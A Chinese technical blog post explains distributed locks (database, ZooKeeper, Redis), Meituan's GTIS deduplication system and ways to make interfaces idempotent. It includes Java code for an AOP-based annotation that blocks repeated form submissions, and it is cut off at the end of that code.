    <content type="html"><![CDATA[<p>本文以美团技术团队分享的“<a href="https://tech.meituan.com/2016/09/29/distributed-system-mutually-exclusive-idempotence-cerberus-gtis.html">分布式系统互斥性与幂等性问题的分析与解决</a>”一文为核心进行笔记记录。</p><p>操作互斥性问题并非分布式环境所独有，在传统的多线程、多进程情况下已经有了很好的解决方案。</p><p>多线程情况下的参考方案可见之前为了面试总结的文章 “并发框架（JUC）”</p><h2 id="多进程的解决方案"><a href="#多进程的解决方案" class="headerlink" title="多进程的解决方案"></a>多进程的解决方案</h2><p>在多道程序系统中存在许多进程，它们共享各种资源，然而有很多资源一次只能供一个进程使用，这便是临界资源。多进程中的临界资源大致上可以分为两类，一类是物理上的真实资源，如打印机；一类是硬盘或内存中的共享数据，如共享内存等。而进程内互斥访问临界资源的代码被称为临界区。</p><p>针对临界资源的互斥访问，JVM层面的锁就已经失去效力了。在多进程的情况下，主要还是利用操作系统层面的进程间通信原理来解决临界资源的抢占问题。比较常见的一种方法便是使用信号量（Semaphores）。</p><p>信号量在POSIX标准下有两种，分别为有名信号量和无名信号量。无名信号量通常保存在共享内存中，而有名信号量是与一个特定的文件名称相关联。信号量是一个整数变量，有计数信号量和二值信号量两种。对信号量的操作，主要是P操作（wait）和V操作（signal）。</p><ul><li>P操作：先检查信号量的大小，若值大于零，则将信号量减1，同时进程获得共享资源的访问权限，继续执行；若小于或者等于零，则该进程被阻塞后，进入等待队列。</li><li>V操作：该操作将信号量的值加1，如果有进程阻塞着等待该信号量，那么其中一个进程将被唤醒。</li></ul><p>举个例子，设信号量为1，当一个进程A在进入临界区之前，先进行P操作。发现值大于零，那么就将信号量减为0，进入临界区执行。此时，若另一个进程B也要进去临界区，进行P操作，发现信号量等于0，则会被阻塞。当进程A退出临界区时，会进行V操作，将信号量的值加1，并唤醒阻塞的进程B。此时B就可以进入临界区了。</p><p>这种方式，其实和多线程环境下的加解锁非常类似。因此用信号量处理临界资源抢占，也可以简单地理解为对临界区进行加锁。</p><p>通过上面的一些了解，我们可以概括出解决互斥性问题，即资源抢占的基本方式为：</p><p><strong>对共享资源的操作前后（进入退出临界区）加解锁，保证不同线程或进程可以互斥有序的操作资源。</strong></p><p>加解锁方式，有显式的加解锁，如ReentrantLock或信号量；也有隐式的加解锁，如synchronized。那么在分布式环境中，为了保证不同JVM不同主机间不会出现资源抢占，那么同样只要对临界区加解锁就可以了。</p><h2 id="分布式环境下的解决方案——分布式锁"><a href="#分布式环境下的解决方案——分布式锁" class="headerlink" title="分布式环境下的解决方案——分布式锁"></a>分布式环境下的解决方案——分布式锁</h2><p>首先，我们来看看分布式锁的基本条件。</p><h3 id="分布式锁条件"><a href="#分布式锁条件" class="headerlink" title="分布式锁条件"></a>分布式锁条件</h3><h4 id="基本条件"><a href="#基本条件" class="headerlink" title="基本条件"></a>基本条件</h4><p>再回顾下多线程和多进程环境下的锁，可以发现锁的实现有很多共通之处，它们都需要满足一些最基本的条件： 1. 需要有存储锁的空间，并且锁的空间是可以访问到的。 2. 锁需要被唯一标识。 3. 锁要有至少两种状态。</p><p>仔细分析这三个条件：</p><ul><li>存储空间</li></ul><p>锁是一个抽象的概念，锁的实现，需要依存于一个可以存储锁的空间。在多线程中是内存，在多进程中是内存或者磁盘。更重要的是，这个空间是可以被访问到的。多线程中，不同的线程都可以访问到堆中的成员变量；在多进程中，不同的进程可以访问到共享内存中的数据或者存储在磁盘中的文件。但是在分布式环境中，不同的主机很难访问对方的内存或磁盘。这就需要一个都能访问到的外部空间来作为存储空间。</p><p>最普遍的外部存储空间就是数据库了，事实上也确实有基于数据库做分布式锁（行锁、version乐观锁），如quartz集群架构中就有所使用。除此以外，还有各式缓存如Redis、Tair、Memcached、Mongodb，当然还有专门的分布式协调服务Zookeeper，甚至是另一台主机。只要可以存储数据、锁在其中可以被多主机访问到，那就可以作为分布式锁的存储空间。</p><ul><li>唯一标识</li></ul><p>不同的共享资源，必然需要用不同的锁进行保护，因此相应的锁必须有唯一的标识。在多线程环境中，锁可以是一个对象，那么对这个对象的引用便是这个唯一标识。多进程环境中，信号量在共享内存中也是由引用来作为唯一的标识。但是如果不在内存中，失去了对锁的引用，如何唯一标识它呢？上文提到的有名信号量，便是用硬盘中的文件名作为唯一标识。因此，在分布式环境中，只要给这个锁设定一个名称，并且保证这个名称是全局唯一的，那么就可以作为唯一标识。</p><ul><li>至少两种状态</li></ul><p>为了给临界区加锁和解锁，需要存储两种不同的状态。如ReentrantLock中的status，0表示没有线程竞争，大于0表示有线程竞争；信号量大于0表示可以进入临界区，小于等于0则表示需要被阻塞。因此只要在分布式环境中，锁的状态有两种或以上：如有锁、没锁；存在、不存在等等，均可以实现。</p><p>有了这三个条件，基本就可以实现一个简单的分布式锁了。下面以数据库为例，实现一个简单的分布式锁： 数据库表，字段为锁的ID（唯一标识），锁的状态（0表示没有被锁，1表示被锁）。 伪代码为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lock = mysql.get(id);</span><br><span class="line">while(lock.status == 1) &#123;</span><br><span class="line">    sleep(100);</span><br><span class="line">&#125;</span><br><span class="line">mysql.update(lock.status = 1);</span><br><span class="line">doSomething();</span><br><span class="line">mysql.update(lock.status = 0);</span><br></pre></td></tr></table></figure><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>以上的方式即可以实现一个粗糙的分布式锁，但是这样的实现，有没有什么问题呢？</p><ul><li>问题1：锁状态判断原子性无法保证 从读取锁的状态，到判断该状态是否为被锁，需要经历两步操作。如果不能保证这两步的原子性，就可能导致不止一个请求获取到了锁，这显然是不行的。因此，我们需要保证锁状态判断的原子性。</li><li>问题2：网络断开或主机宕机，锁状态无法清除 假设在主机已经获取到锁的情况下，突然出现了网络断开或者主机宕机，如果不做任何处理该锁将仍然处于被锁定的状态。那么之后所有的请求都无法再成功抢占到这个锁。因此，我们需要在持有锁的主机宕机或者网络断开的时候，及时的释放掉这把锁。</li><li>问题3：无法保证释放的是自己上锁的那把锁 在解决了问题2的情况下再设想一下，假设持有锁的主机A在临界区遇到网络抖动导致网络断开，分布式锁及时的释放掉了这把锁。之后，另一个主机B占有了这把锁，但是此时主机A网络恢复，退出临界区时解锁。由于都是同一把锁，所以A就会将B的锁解开。此时如果有第三个主机尝试抢占这把锁，也将会成功获得。因此，我们需要在解锁时，确定自己解的这个锁正是自己锁上的。</li></ul><h4 id="进阶条件"><a href="#进阶条件" class="headerlink" title="进阶条件"></a>进阶条件</h4><p>如果分布式锁的实现，还能再解决上面的三个问题，那么就可以算是一个相对完整的分布式锁了。然而，在实际的系统环境中，还会对分布式锁有更高级的要求。</p><ol><li>可重入：线程中的可重入，指的是外层函数获得锁之后，内层也可以获得锁，ReentrantLock和synchronized都是可重入锁；衍生到分布式环境中，一般仍然指的是线程的可重入，在绝大多数分布式环境中，都要求分布式锁是可重入的。</li><li>惊群效应（Herd Effect）：在分布式锁中，惊群效应指的是，在有多个请求等待获取锁的时候，一旦占有锁的线程释放之后，如果所有等待的方都同时被唤醒，尝试抢占锁。但是这样的情况会造成比较大的开销，那么在实现分布式锁的时候，应该尽量避免惊群效应的产生。</li><li>公平锁和非公平锁：不同的需求，可能需要不同的分布式锁。非公平锁普遍比公平锁开销小。但是业务需求如果必须要锁的竞争者按顺序获得锁，那么就需要实现公平锁。</li><li>阻塞锁和自旋锁：针对不同的使用场景，阻塞锁和自旋锁的效率也会有所不同。阻塞锁会有上下文切换，如果并发量比较高且临界区的操作耗时比较短，那么造成的性能开销就比较大了。但是如果临界区操作耗时比较长，一直保持自旋，也会对CPU造成更大的负荷。</li></ol><p>保留以上所有问题和条件，我们接下来看一些比较典型的实现方案。</p><h3 id="典型实现"><a href="#典型实现" class="headerlink" title="典型实现"></a>典型实现</h3><h4 id="ZooKeeper的实现"><a href="#ZooKeeper的实现" class="headerlink" title="ZooKeeper的实现"></a>ZooKeeper的实现</h4><p>ZooKeeper（以下简称“ZK”）中有一种节点叫做顺序节点，假如我们在&#x2F;lock&#x2F;目录下创建3个节点，ZK集群会按照发起创建的顺序来创建节点，节点分别为&#x2F;lock&#x2F;0000000001、&#x2F;lock&#x2F;0000000002、&#x2F;lock&#x2F;0000000003。</p><p>ZK中还有一种名为临时节点的节点，临时节点由某个客户端创建，当客户端与ZK集群断开连接，则该节点自动被删除。EPHEMERAL_SEQUENTIAL为临时顺序节点。</p><p>根据ZK中节点是否存在，可以作为分布式锁的锁状态，以此来实现一个分布式锁，下面是分布式锁的基本逻辑： 1. 客户端调用create()方法创建名为“&#x2F;dlm-locks&#x2F;lockname&#x2F;lock-”的临时顺序节点。 2. 客户端调用getChildren(“lockname”)方法来获取所有已经创建的子节点。 3. 客户端获取到所有子节点path之后，如果发现自己在步骤1中创建的节点是所有节点中序号最小的，那么就认为这个客户端获得了锁。 4. 如果创建的节点不是所有节点中需要最小的，那么则监视比自己创建节点的序列号小的最大的节点，进入等待。直到下次监视的子节点变更的时候，再进行子节点的获取，判断是否获取锁。</p><p>释放锁的过程相对比较简单，就是删除自己创建的那个子节点即可，不过也仍需要考虑删除节点失败等异常情况。</p><p>开源的基于ZK的Menagerie的源码就是一个典型的例子：<a href="https://github.com/sfines/menagerie">https://github.com/sfines/menagerie</a> 。</p><p>Menagerie中的lock首先实现了可重入锁，利用ThreadLocal存储进入的次数，每次加锁次数加1，每次解锁次数减1。如果判断出是当前线程持有锁，就不用走获取锁的流程。</p><p>通过tryAcquireDistributed方法尝试获取锁，循环判断前序节点是否存在，如果存在则监视该节点并且返回获取失败。如果前序节点不存在，则再判断更前一个节点。如果判断出自己是第一个节点，则返回获取成功。</p><p>为了在别的线程占有锁的时候阻塞，代码中使用JUC的condition来完成。如果获取尝试锁失败，则进入等待且放弃localLock，等待前序节点唤醒。而localLock是一个本地的公平锁，使得condition可以公平的进行唤醒，配合循环判断前序节点，实现了一个公平锁。</p><p>这种实现方式非常类似于ReentrantLock的CHL队列，而且zk的临时节点可以直接避免网络断开或主机宕机，锁状态无法清除的问题，顺序节点可以避免惊群效应。这些特性都使得利用ZK实现分布式锁成为了最普遍的方案之一。</p><h4 id="Redis的实现"><a href="#Redis的实现" class="headerlink" title="Redis的实现"></a>Redis的实现</h4><p>Redis的分布式缓存特性使其成为了分布式锁的一种基础实现。通过Redis中是否存在某个锁ID，则可以判断是否上锁。为了保证判断锁是否存在的原子性，保证只有一个线程获取同一把锁，Redis有<strong>SETNX</strong>（即SET if Not eXists）和<strong>GETSET</strong>（先写新值，返回旧值，原子性操作，可以用于分辨是不是首次操作）操作。</p><p>为了防止主机宕机或网络断开之后的死锁，Redis没有ZK那种天然的实现方式，只能依赖设置超时时间来规避。</p><p>以下是一种比较普遍但不太完善的Redis分布式锁的实现步骤： 1. 线程A发送SETNX lock.orderid 尝试获得锁，如果锁不存在，则set并获得锁。 2. 如果锁存在，则再判断锁的值（时间戳）是否大于当前时间，如果没有超时，则等待一下再重试。 3. 如果已经超时了，在用GETSET lock.{orderid} 来尝试获取锁，如果这时候拿到的时间戳仍旧超时，则说明已经获得锁了。 4. 如果在此之前，另一个线程C快一步执行了上面的操作，那么A拿到的时间戳是个未超时的值，这时A没有如期获得锁，需要再次等待或重试。</p><p>该实现还有一个需要考虑的问题是全局时钟问题，由于生产环境主机时钟不能保证完全同步，对时间戳的判断也可能会产生误差。</p><p>以上是Redis的一种常见的实现方式，除此以外还可以用SETNX+EXPIRE来实现。Redisson是一个官方推荐的Redis客户端并且实现了很多分布式的功能。它的分布式锁就提供了一种更完善的解决方案，源码：<a href="https://github.com/mrniko/redisson">https://github.com/mrniko/redisson</a> 。</p><h2 id="GTIS"><a href="#GTIS" class="headerlink" title="GTIS"></a>GTIS</h2><p>GTIS是美团技术团队的一个解决方案。它是一个轻量的重复操作关卡系统，它能够确保在分布式环境中操作的唯一性。我们可以用它来间接保证每个操作的幂等性。它具有如下特点： * 高效：低延时，单个方法平均响应时间在2ms内，几乎不会对业务造成影响； * 可靠：提供降级策略，以应对外部存储引擎故障所造成的影响；提供应用鉴权，提供集群配置自定义，降低不同业务之间的干扰； * 简单：接入简捷方便，学习成本低。只需简单的配置，在代码中进行两个方法的调用即可完成所有的接入工作； * 灵活：提供多种接口参数、使用策略，以满足不同的业务需求。</p><h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>GTIS的实现思路是将每一个不同的业务操作赋予其唯一性。这个唯一性是通过对不同操作所对应的唯一的内容特性生成一个唯一的全局ID来实现的。基本原则为：相同的操作生成相同的全局ID；不同的操作生成不同的全局ID。</p><p>生成的全局ID需要存储在外部存储引擎中，数据库、Redis亦或是Tair等等均可实现。考虑到Tair天生分布式和持久化的优势，目前的GTIS存储在Tair中。其相应的key和value如下：</p><ul><li>key：将对于不同的业务，采用APP_KEY+业务操作内容特性生成一个唯一标识trans_contents。然后对唯一标识进行加密生成全局ID作为Key。</li><li>value：current_timestamp + trans_contents，current_timestamp用于标识当前的操作线程。</li></ul><p>判断是否重复，主要利用Tair的SETNX方法，如果原来没有值则set且返回成功，如果已经有值则返回失败。</p><h4 id="内部流程"><a href="#内部流程" class="headerlink" title="内部流程"></a>内部流程</h4><p>GTIS的内部实现流程为：</p><ol><li>业务方在业务操作之前，生成一个能够唯一标识该操作的transContents，传入GTIS；</li><li>GTIS根据传入的transContents，用MD5生成全局ID；</li><li>GTIS将全局ID作为key，current_timestamp+transContents作为value放入Tair进行setNx，将结果返回给业务方；</li><li>业务方根据返回结果确定能否开始进行业务操作；</li><li>若能，开始进行操作；若不能，则结束当前操作；</li><li>业务方将操作结果和请求结果传入GTIS，系统进行一次请求结果的检验；</li><li>若该次操作成功，GTIS根据key取出value值，跟传入的返回结果进行比对，如果两者相等，则将该全局ID的过期时间改为较长时间；</li><li>GTIS返回最终结果。</li></ol><h4 id="实现难点"><a href="#实现难点" class="headerlink" title="实现难点"></a>实现难点</h4><p>GTIS的实现难点在于如何保证其判断重复的可靠性。由于分布式环境的复杂度和业务操作的不确定性，在上一章节分布式锁的实现中考虑的网络断开或主机宕机等等问题，同样需要在GTIS中设法解决。这里列出几个典型的场景：</p><ul><li>如果操作执行失败，理想的情况应该是另一个相同的操作可以立即进行。因此，需要对业务方的操作结果进行判断，如果操作失败，那么就需要立即删除该全局ID；</li><li>如果操作超时或主机宕机，当前的操作无法告知GTIS操作是否成功。那么我们必须引入超时机制，一旦长时间获取不到业务方的操作反馈，那么也需要该全局ID失效；</li><li>结合上两个场景，既然全局ID会失效并且可能会被删除，那就需要保证删除的不是另一个相同操作的全局ID。这就需要将特殊的标识记录下来，并由此来判断。这里所用的标识为当前时间戳。</li></ul><p>可以看到，解决这些问题的思路，也和上一章节中的实现有很多类似的地方。除此以外，还有更多的场景需要考虑和解决，所有分支流程如下:</p><p><img src="/upload/meituan-gtis.jpg" alt="meituan-gtis.jpg"></p><p>使用方需要考虑的主要是下面两个参数：</p><ul><li>空间全局性：业务方输入的能够标志操作唯一性的内容特性，可以是唯一性的String类型的ID，也可以是map、POJO等形式。如订单ID等</li><li>时间全局性：确定在多长时间内不允许重复，1小时内还是一个月内亦或是永久。</li></ul><h2 id="幂等性"><a href="#幂等性" class="headerlink" title="幂等性"></a>幂等性</h2><p><strong>概念：</strong>多次调用方法或者接口不会改变业务状态，可以保证重复调用的结果和单次调用的结果一致。</p><p>设计一个接口的时候，幂等都是首要考虑的问题，特别是当你负责设计转账、支付这种涉及到 money 的接口</p><h3 id="1、token-机制实现"><a href="#1、token-机制实现" class="headerlink" title="1、token 机制实现"></a>1、token 机制实现</h3><p>通过token 机制实现接口的幂等性,这是一种比较通用性的实现方法。</p><p>具体流程步骤：</p><ol><li>客户端会先发送一个请求去获取 token，服务端会生成一个全局唯一的 ID 作为 token 保存在 redis 中，同时把这个 ID 返回给客户端</li><li>客户端第二次调用业务请求的时候必须携带这个 token</li><li>服务端会校验这个 token，如果校验成功，则执行业务，并删除 redis 中的 token</li><li>如果校验失败，说明 redis 中已经没有对应的 token，则表示重复操作，直接返回指定的结果给客户端</li></ol><p>注意：</p><ol><li>对 redis 中是否存在 token 以及删除的代码逻辑建议用 Lua 脚本实现，保证原子性</li><li>全局唯一 ID 可以用百度的 uid-generator、美团的 Leaf 去生成</li></ol><h3 id="2、基于-mysql-实现"><a href="#2、基于-mysql-实现" class="headerlink" title="2、基于 mysql 实现"></a>2、基于 mysql 实现</h3><p>这种实现方式是利用 mysql 唯一索引的特性。</p><p>具体流程步骤：</p><ol><li>建立一张去重表，其中某个字段需要建立唯一索引</li><li>客户端去请求服务端，服务端会将这次请求的一些信息插入这张去重表中</li><li>因为表中某个字段带有唯一索引，如果插入成功，证明表中没有这次请求的信息，则执行后续的业务逻辑</li><li>如果插入失败，则代表已经执行过当前请求，直接返回</li></ol><h2 id="接口幂等性实现代码"><a href="#接口幂等性实现代码" class="headerlink" title="接口幂等性实现代码"></a>接口幂等性实现代码</h2><p>采用自定义注解+aop的方式，自定义一个<code>RepeatSubmit</code>注解，然后采用doBefore和doAftterReturing方法实现幂等。设计上参考了GTIS防重系统，完整代码如下：</p><p>RepeatSubmit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 自定义注解防止表单重复提交</span><br><span class="line"> *</span><br><span class="line"> * @author Lion Li</span><br><span class="line"> */</span><br><span class="line">@Inherited</span><br><span class="line">@Target(ElementType.METHOD)</span><br><span class="line">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">@Documented</span><br><span class="line">public @interface RepeatSubmit &#123;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 间隔时间(ms)，小于此时间视为重复提交</span><br><span class="line">     */</span><br><span class="line">    int interval() default 5000;</span><br><span class="line"></span><br><span class="line">    TimeUnit timeUnit() default TimeUnit.MILLISECONDS;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 提示消息 支持国际化 格式为 &#123;code&#125;</span><br><span class="line">     */</span><br><span class="line">    String message() default &quot;&#123;repeat.submit.message&#125;&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RepeatSubmitAspect</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">import cn.dev33.satoken.SaManager;</span><br><span class="line">    import cn.hutool.core.util.ArrayUtil;</span><br><span class="line">    import cn.hutool.core.util.ObjectUtil;</span><br><span class="line">    import cn.hutool.crypto.SecureUtil;</span><br><span class="line">    import org.dromara.common.core.constant.GlobalConstants;</span><br><span class="line">    import org.dromara.common.core.domain.R;</span><br><span class="line">    import org.dromara.common.core.exception.ServiceException;</span><br><span class="line">    import org.dromara.common.core.utils.MessageUtils;</span><br><span class="line">    import org.dromara.common.core.utils.ServletUtils;</span><br><span class="line">    import org.dromara.common.core.utils.StringUtils;</span><br><span class="line">    import org.dromara.common.idempotent.annotation.RepeatSubmit;</span><br><span class="line">    import org.dromara.common.json.utils.JsonUtils;</span><br><span class="line">    import org.dromara.common.redis.utils.RedisUtils;</span><br><span class="line">    import jakarta.servlet.http.HttpServletRequest;</span><br><span class="line">    import jakarta.servlet.http.HttpServletResponse;</span><br><span class="line">    import org.aspectj.lang.JoinPoint;</span><br><span class="line">    import org.aspectj.lang.annotation.AfterReturning;</span><br><span class="line">    import org.aspectj.lang.annotation.AfterThrowing;</span><br><span class="line">    import org.aspectj.lang.annotation.Aspect;</span><br><span class="line">    import org.aspectj.lang.annotation.Before;</span><br><span class="line">    import org.springframework.validation.BindingResult;</span><br><span class="line">    import org.springframework.web.multipart.MultipartFile;</span><br><span class="line"></span><br><span class="line">    import java.time.Duration;</span><br><span class="line">    import java.util.Collection;</span><br><span class="line">    import java.util.Map;</span><br><span class="line">    import java.util.StringJoiner;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 防止重复提交(参考美团GTIS防重系统)</span><br><span class="line"> *</span><br><span class="line"> * @author Lion Li</span><br><span class="line"> */</span><br><span class="line">@Aspect</span><br><span class="line">public class RepeatSubmitAspect &#123;</span><br><span class="line"></span><br><span class="line">    private static final ThreadLocal&lt;String&gt; KEY_CACHE = new ThreadLocal&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    @Before(&quot;@annotation(repeatSubmit)&quot;)</span><br><span class="line">    public void doBefore(JoinPoint point, RepeatSubmit repeatSubmit) throws Throwable &#123;</span><br><span class="line">        // 如果注解不为0 则使用注解数值</span><br><span class="line">        long interval = repeatSubmit.timeUnit().toMillis(repeatSubmit.interval());</span><br><span class="line"></span><br><span class="line">        if (interval &lt; 1000) &#123;</span><br><span class="line">            throw new ServiceException(&quot;重复提交间隔时间不能小于&#x27;1&#x27;秒&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        HttpServletRequest request = ServletUtils.getRequest();</span><br><span class="line">        String nowParams = argsArrayToString(point.getArgs());</span><br><span class="line"></span><br><span class="line">        // 请求地址（作为存放cache的key值）</span><br><span class="line">        String url = request.getRequestURI();</span><br><span class="line"></span><br><span class="line">        // 唯一值（没有消息头则使用请求地址）</span><br><span class="line">        String submitKey = StringUtils.trimToEmpty(request.getHeader(SaManager.getConfig().getTokenName()));</span><br><span class="line"></span><br><span class="line">        submitKey = SecureUtil.md5(submitKey + &quot;:&quot; + nowParams);</span><br><span class="line">        // 唯一标识（指定key + url + 消息头）</span><br><span class="line">        String cacheRepeatKey = GlobalConstants.REPEAT_SUBMIT_KEY + url + submitKey;</span><br><span class="line">        if (RedisUtils.setObjectIfAbsent(cacheRepeatKey, &quot;&quot;, Duration.ofMillis(interval))) &#123;</span><br><span class="line">            KEY_CACHE.set(cacheRepeatKey);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            String message = repeatSubmit.message();</span><br><span class="line">            if (StringUtils.startsWith(message, &quot;&#123;&quot;) &amp;&amp; StringUtils.endsWith(message, &quot;&#125;&quot;)) &#123;</span><br><span class="line">                message = MessageUtils.message(StringUtils.substring(message, 1, message.length() - 1));</span><br><span class="line">            &#125;</span><br><span class="line">            throw new ServiceException(message);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 处理完请求后执行</span><br><span class="line">     *</span><br><span class="line">     * @param joinPoint 切点</span><br><span class="line">     */</span><br><span class="line">    @AfterReturning(pointcut = &quot;@annotation(repeatSubmit)&quot;, returning = &quot;jsonResult&quot;)</span><br><span class="line">    public void doAfterReturning(JoinPoint joinPoint, RepeatSubmit repeatSubmit, Object jsonResult) &#123;</span><br><span class="line">        if (jsonResult instanceof R&lt;?&gt; r) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                // 成功则不删除redis数据 保证在有效时间内无法重复提交</span><br><span class="line">                if (r.getCode() == R.SUCCESS) &#123;</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                RedisUtils.deleteObject(KEY_CACHE.get());</span><br><span class="line">            &#125; finally &#123;</span><br><span class="line">                KEY_CACHE.remove();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 拦截异常操作</span><br><span class="line">     *</span><br><span class="line">     * @param joinPoint 切点</span><br><span class="line">     * @param e         异常</span><br><span class="line">     */</span><br><span class="line">    @AfterThrowing(value = &quot;@annotation(repeatSubmit)&quot;, throwing = &quot;e&quot;)</span><br><span class="line">    public void doAfterThrowing(JoinPoint joinPoint, RepeatSubmit repeatSubmit, Exception e) &#123;</span><br><span class="line">        RedisUtils.deleteObject(KEY_CACHE.get());</span><br><span class="line">        KEY_CACHE.remove();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 参数拼装</span><br><span class="line">     */</span><br><span class="line">    private String argsArrayToString(Object[] paramsArray) &#123;</span><br><span class="line">        StringJoiner params = new StringJoiner(&quot; &quot;);</span><br><span class="line">        if (ArrayUtil.isEmpty(paramsArray)) &#123;</span><br><span class="line">            return params.toString();</span><br><span class="line">        &#125;</span><br><span class="line">        for (Object o : paramsArray) &#123;</span><br><span class="line">            if (ObjectUtil.isNotNull(o) &amp;&amp; !isFilterObject(o)) &#123;</span><br><span class="line">                params.add(JsonUtils.toJsonString(o));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return params.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 判断是否需要过滤的对象。</span><br><span class="line">     *</span><br><span class="line">     * @param o 对象信息。</span><br><span class="line">     * @return 如果是需要过滤的对象，则返回true；否则返回false。</span><br><span class="line">     */</span><br><span class="line">    @SuppressWarnings(&quot;rawtypes&quot;)</span><br><span class="line">    public boolean isFilterObject(final Object o) &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = o.getClass();</span><br><span class="line">        if (clazz.isArray()) &#123;</span><br><span class="line">            return clazz.getComponentType().isAssignableFrom(MultipartFile.class);</span><br><span class="line">        &#125; else if (Collection.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            Collection collection = (Collection) o;</span><br><span class="line">            for (Object value : collection) &#123;</span><br><span class="line">                return value instanceof MultipartFile;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if (Map.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            Map map = (Map) o;</span><br><span class="line">            for (Object value : map.values()) &#123;</span><br><span class="line">                return value instanceof MultipartFile;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return o instanceof MultipartFile || o instanceof HttpServletRequest || o instanceof HttpServletResponse</span><br><span class="line">            || o instanceof BindingResult;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span 